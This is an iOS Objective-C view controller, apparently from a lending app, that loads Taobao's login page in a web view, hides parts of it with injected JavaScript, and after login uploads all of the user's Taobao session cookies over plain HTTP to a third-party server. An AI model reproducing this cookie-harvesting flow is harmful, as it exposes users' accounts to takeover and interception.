//
//  NetTaoBaoViewController.m
//  HDJFKJ
//
//  Created by 薛振超 on 16/4/10.
//  Copyright © 2016年 LDSmallCat. All rights reserved.
//

#import "NetTaoBaoViewController.h"
#import "WHUserLoginModel.h"
#import "LoanAgreementViewController.h"
#define STATUSBAR_HEIGHT                        20
#define NAVIGATIONBAR_HEIGHT                    44
#define kCommon_Text_Color                      HEXCOLOR(0x333333)  //普通文字颜色
#define SCREEN_WIDTH                            ([[UIScreen mainScreen] applicationFrame].size.width)
#define SCREEN_HEIGHT                           ([[UIScreen mainScreen] applicationFrame].size.height)
@interface NetTaoBaoViewController ()<UIWebViewDelegate>


@property(nonatomic,strong)UIButton                *   mCheckBoxButton;
@property(nonatomic,strong)NSString                *   taobaoID;
@property(nonatomic,strong)NSString                *   tbusername;
@property(nonatomic,strong)UIWebView               *   webView;
@property(nonatomic,strong)NSURLRequest            *   request;
@property(nonatomic,strong)UIActivityIndicatorView *   activityView;
@property(nonatomic,strong)UILabel                 *   infoLable;
@property(nonatomic,assign)BOOL                        isChecked;
@property(nonatomic,assign)BOOL                        doCookieGeted;
@property(nonatomic,assign)CGFloat                     mPosY;
@property(nonatomic,assign)CGFloat                     mPromptHeight;

@property (nonatomic,strong) WHUserLoginModel * user;


@end

@implementation NetTaoBaoViewController
- (void)viewWillAppear:(BOOL)animated{
    [super viewWillAppear:animated];
}
- (void)viewWillDisappear:(BOOL)animated{
    [super viewWillDisappear:animated];
}
- (void)viewDidLoad {
    
    self.title = @"淘宝授权";
    
    self.view.backgroundColor = WHColorFromRGB(0xf0f0f0);
    self.mPromptHeight = 40;
    
    [super viewDidLoad];
    
    [self createAgreementItem];
    [self createNoteItem];
    
    [self createPromptItem];
    [self createWebView];
    
    
    self.user = [WHUserLoginModel createuserInfoModel];

    [self createGobackHomePageButton];
}
/**
 * 创建导航栏右侧关闭按钮
 **/
- (void)createGobackHomePageButton{
    
    
    UIButton * backPage = [[UIButton alloc]init];
    
    backPage.frame =CGRectMake(0, 0, 30, 30);
    
    [backPage setImage:[UIImage imageNamed:@"X_guanbi"] forState:UIControlStateNormal];
    
    [backPage addTarget:self action:@selector(ClickdismissButton:) forControlEvents:UIControlEventTouchUpInside];
    
    /** 缩小控件与屏幕的间距 */
    UIBarButtonItem *negativeSpacer = [[UIBarButtonItem alloc]initWithBarButtonSystemItem:UIBarButtonSystemItemFixedSpace target:nil action:nil];
    negativeSpacer.width = -10;
    
    //作为Item的子视图添加上去
    UIBarButtonItem *leftItem = [[UIBarButtonItem alloc] initWithCustomView:backPage];
    self.navigationItem.leftBarButtonItems = [NSArray arrayWithObjects:negativeSpacer,leftItem, nil];
    
}
/**
 * 关闭控制器
 **/
- (void)ClickdismissButton:(UIButton *)sender {
    
    [self.view endEditing:YES];
    
    [self.navigationController dismissViewControllerAnimated:YES completion:nil];
}

- (void)createNoteItem
{
    self.mPosY = 20 + NAVIGATIONBAR_HEIGHT + STATUSBAR_HEIGHT;
    UILabel *labelView = [[UILabel alloc] init];
    labelView.font = [UIFont systemFontOfSize:14.0f];
    labelView.textColor = [UIColor blackColor];
    labelView.backgroundColor = [UIColor clearColor];
    labelView.lineBreakMode = NSLineBreakByCharWrapping;
    labelView.numberOfLines = 0;
    labelView.text = @"禀主公,请直接登录淘宝账号,进行额外操作可能导致授权失败(不支持支付宝账号登录)";
    
    CGSize size = [labelView.text boundingRectWithSize:CGSizeMake(SCREEN_WIDTH/3*2, 1000.0f)// 用于计算文本绘制时占据的矩形块
                                               options:NSStringDrawingUsesLineFragmentOrigin | NSStringDrawingUsesFontLeading // 文本绘制时的附加选项
                                            attributes:@{NSFontAttributeName:labelView.font}        // 文字的属性
                                               context:nil].size; // context上下文。包括一些信息，例如如何调整字间距以及缩放。该对象包含的信息将用于文本绘制。该参数可为nil
    
    labelView.frame = CGRectMake(SCREEN_WIDTH/3-20, 335, size.width, size.height);
    [self.view addSubview:labelView];
    
    UIImage *img = [UIImage imageNamed:@"tao_auth"];
    UIImageView *imgView = [[UIImageView alloc] initWithFrame:CGRectMake((SCREEN_WIDTH/3-img.size.width)/2, 330, img.size.width, img.size.height)];
    imgView.image = img;
    [self.view addSubview:imgView];
    
    self.mPosY += size.height + 20;
}


- (void)createWebView
{
    self.mPosY = 20 + NAVIGATIONBAR_HEIGHT + STATUSBAR_HEIGHT;
    CGFloat height = SCREEN_HEIGHT+STATUSBAR_HEIGHT-self.mPosY-self.mPromptHeight*2;
    self.webView = [[UIWebView alloc] init];
    self.webView.delegate = self;
    self.webView.backgroundColor = [UIColor clearColor];
    self.webView.frame = CGRectMake(0,10, [UIScreen mainScreen].bounds.size.width, 280);
    [self.view addSubview:_webView];
    if (self.activityView == nil) {
        self.activityView = [[UIActivityIndicatorView alloc] initWithActivityIndicatorStyle:UIActivityIndicatorViewStyleWhiteLarge];
        self.activityView.color = [UIColor grayColor];
    }
    self.activityView.center = CGPointMake(self.view.frame.size.width/2, self.view.frame.size.height/2 - 50);
    [self.view addSubview:self.activityView];
    [self.activityView startAnimating];
    
    NSString *urlStr = [NSString stringWithFormat:@"https://login.m.taobao.com/login.htm"];
    NSString *encodedString=[urlStr stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding];
    NSURL * url = [NSURL URLWithString:encodedString];
    _request = [NSURLRequest requestWithURL:url];
    
    [[NSURLCache sharedURLCache] removeCachedResponseForRequest:_request];
    [_webView loadRequest:_request];
    
    self.mPosY += height;
}

- (void)createAgreementItem
{
    self.mCheckBoxButton = [UIButton buttonWithType:UIButtonTypeCustom];
    self.mCheckBoxButton.frame = CGRectMake(30, 285, 30, 50);
    [self.mCheckBoxButton addTarget:self action:@selector(onTapCheckBoxButton) forControlEvents:UIControlEventTouchUpInside];
    [self.mCheckBoxButton setImage:[UIImage imageNamed:@"btn_radio_buttons_s"] forState:UIControlStateNormal];
    [self.view addSubview:self.mCheckBoxButton];
    
    self.isChecked = YES;
    UIButton *btn = [UIButton buttonWithType:UIButtonTypeCustom];
    btn.frame = CGRectMake(self.mCheckBoxButton.frame.size.width+30, 300, 255, 20);
    [btn setTitle:@"同意 《淘宝网信息授权协议》" forState:UIControlStateNormal];
    [btn setTitleColor:[UIColor blackColor] forState:UIControlStateNormal];
    [btn addTarget:self action:@selector(onTapAgreementButton) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:btn];
    //self.mPosY += 46;
}

- (void)createPromptItem
{
    UIImage *img = [UIImage imageNamed:@"resize_png_new"];
    UIImageView *imgView = [[UIImageView alloc] initWithFrame:CGRectMake(img.size.width+4, self.mPosY, img.size.width, img.size.height)];
    imgView.image = img;
    [self.webView addSubview:imgView];
    
    UILabel *label = [[UILabel alloc] init];
    label.textColor = [UIColor grayColor];
    label.backgroundColor = [UIColor clearColor];
    label.font = [UIFont systemFontOfSize:14.0f];
    label.text =  NSLocalizedString(@"信息多重加密，全方位安全保障", nil);
    label.frame = CGRectMake(imgView.frame.size.width+8, self.mPosY, 200, 20);
    [self.view addSubview:label];
}


#pragma mark - 按钮事件

//返回
- (void)backAction:(UIButton *)btn
{
    [self.navigationController popViewControllerAnimated:YES];
}


- (void)onTapCheckBoxButton
{
    self.isChecked = !self.isChecked;
    
    if (self.isChecked)
    {
        [self.mCheckBoxButton setImage:[UIImage imageNamed:@"btn_radio_buttons_s"] forState:UIControlStateNormal];
    }
    else
    {
        [self.mCheckBoxButton setImage:[UIImage imageNamed:@"btn_radio_buttons_n"] forState:UIControlStateNormal];
    }
}

- (void)onTapAgreementButton
{

    //http://authtest.wecash.net:8611
    LoanAgreementViewController * loanAgreement = [[LoanAgreementViewController alloc]initWithURL:@"http://u.u-credit.com.cn/wx/taoagreement.html"];
    [self.navigationController pushViewController:loanAgreement animated:YES];
    
    
}


#pragma mark - GSXLoanAgreementViewControllerDelegate
- (void)onTapLoanAgreement
{
    self.isChecked = YES;
    [self.mCheckBoxButton setImage:[UIImage imageNamed:@"btn_radio_buttons_s"] forState:UIControlStateNormal];
}


- (NSString *)hideOtherJsStr
{
    return @"(function(){"
    @"var elems = document.querySelectorAll('header, div.login-option, footer.footer');"
    @"var array = [].slice.call(elems, 0);"
    @"array.forEach(function(item){"
    @"    item.style.display = 'none';"
    @"});"
    @"})();";
}


- (void)webViewDidFinishLoad:(UIWebView *)webView
{
    
    [_webView stringByEvaluatingJavaScriptFromString:[self hideOtherJsStr]];
    [self.activityView stopAnimating];
}

- (void)webView:(UIWebView *)webView didFailLoadWithError:(NSError *)error
{
    [self.activityView stopAnimating];
}


- (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType
{
    
    if (!self.isChecked)
    {
        //判断是否遵守淘宝授权协议
//        [self.hudManager showMessage:@"请先同意淘宝网信息授权协议" duration:1.5f];
        //[SVProgressHUD showWithStatus:@"请先同意淘宝网信息授权协议"];
        UIAlertView * alert = [[UIAlertView alloc]initWithTitle:@"提示" message:@"请先同意淘宝网信息授权协议" delegate:self cancelButtonTitle:@"确定" otherButtonTitles:nil];
        [alert show];
        return NO;
    }
    
    NSHTTPCookieStorage *cookieStro = [NSHTTPCookieStorage sharedHTTPCookieStorage];
    NSMutableArray *array = [NSMutableArray new];
    NSMutableDictionary *dic = [NSMutableDictionary new];
    for (NSHTTPCookie * cookie in [cookieStro cookiesForURL:request.URL]) {
        if ([cookie.name isEqualToString:@"unb"]) {
            _taobaoID =[cookie.value copy];
        }
        if ([cookie.name isEqualToString:@"_nk_"]) {
            _tbusername = [cookie.value copy];
        }
        NSMutableDictionary * dict = [NSMutableDictionary new];
        [dict setObject:[NSString stringWithFormat:@"%@",cookie.expiresDate] forKey:@"expiryDate"];
        [dict setObject:cookie.name forKey:@"name"];
        [dict setObject:cookie.path forKey:@"path"];
        [dict setObject:cookie.domain forKey:@"domain"];
        [dict setObject:cookie.value forKey:@"value"];
        [array addObject:dict];
        
        
        if ([cookie.name isEqualToString:@"tracknick"])
        {
            //                nick = cookie.value;
            
            //防止进来后自动授权，清除cookie
            self.doCookieGeted = true;
            [[NSHTTPCookieStorage sharedHTTPCookieStorage] deleteCookie:cookie];
        }
    }
    if (self.doCookieGeted) {//拦截跳转上传
        webView.hidden = YES;
        NSData *data = [NSJSONSerialization dataWithJSONObject:array options:NSJSONWritingPrettyPrinted error:NULL];
        NSString *str = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
        [dic setObject:str forKey:@"cookies"];
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            [self postCookies:dic];//上传cookie数据
        });
        return NO;
    }
    return YES;
}
#pragma mark - 网络请求与响应
//发送cookies  到服务端
-(void)postCookies:(NSMutableDictionary *)cookiesDic{
    
    dispatch_async(dispatch_get_main_queue(), ^{
        
        [self.activityView startAnimating];
        self.infoLable = [[UILabel alloc]init];
        self.infoLable.text = @"正在授权淘宝.....";
        self.infoLable.textColor = [UIColor grayColor];
        [self.view addSubview: self.infoLable];
        [self.infoLable mas_makeConstraints:^(MASConstraintMaker *make){
            make.top.equalTo(self.activityView.mas_bottom).offset(30);
            make.centerX.equalTo(self.view);
        }];
        NSLog(@"infolabl : %@ %@",self.infoLable.width,self.infoLable.height);
    });
    
    
    NSString * strUrl = [NSString stringWithFormat:@"http://taobao-new.wecash.net/TestTaobao/servlet/PushCookieServlet"];
    if (!_tbusername) {
        _tbusername = @"";
    }
    [cookiesDic setObject:_tbusername forKey:@"tbusername"];
    
    [[LDNetworkTools sharedTools] request:POST url:strUrl params:cookiesDic callback:^(id response, NSError *error) {
        if (error != nil) {
            
            /** 1.打印错误信息 */
            NSLog(@"%@",error);
            
            /** 2.请求错误提示 */
            [MBProgressHUD showError:@"网络错误"];
        }else{
            
            /** 3.解析返回信息 */
            LDBackInformation * backInfo = [LDBackInformation mj_objectWithKeyValues:response];
            
            //code == 100请求成功
            if ([backInfo.code isEqualToString:@"100"]) {
                [MBProgressHUD hideHUD];
                
                    NSLog(@"TaoBao auth cookies catch success");
                    [self sendTaobaoAuth:_tbusername];
                
                
            }else{
            
                // 显示失败信息
                [MBProgressHUD showError:backInfo.msg];
                
            }
            LDLog(@"%@",response);
        }
    }];

}

-(void)sendTaobaoAuth:(NSString*)taobaoName{
    
    [MBProgressHUD showMessage:@"正在授权"];
    NSString * strUrl = [NSString stringWithFormat:@"%@userInfo/authTaoBao",KBaseUrl];
    if (!_tbusername) {
        _tbusername = @"";
    }
    
    NSMutableDictionary * params = [NSMutableDictionary dictionary];
    [params setObject:[LDUserInformation sharedInstance].UserId forKey:@"userId"];
    [params setObject:_tbusername forKey:@"taobaoName"];
    
    
    [[LDNetworkTools sharedTools] request:POST url:strUrl params:params callback:^(id response, NSError *error) {
        if (error != nil) {
            
            /** 1.打印请求错误信息  */
            NSLog(@"%@",error);
            
            /** 2.请求错误提示 */
            [MBProgressHUD showError:@"网络错误"];
        }else{
            
            LDLog(@"%@",response);
            
            /** 3.解析返回数据 */
            
            LDBackInformation * backInfo = [LDBackInformation mj_objectWithKeyValues:response];
        
            if ([backInfo.errcode isEqualToString:@"200"]) {
                
                
                [MBProgressHUD hideHUD];

                _taobaoBlock(@"1");
                [self.navigationController dismissViewControllerAnimated:YES completion:nil];
                   
                
                
            }else{
                
                /** 显示失败信息*/
                [MBProgressHUD showError:backInfo.msg];
            }
            
        }
    }];
    
    
}




@end
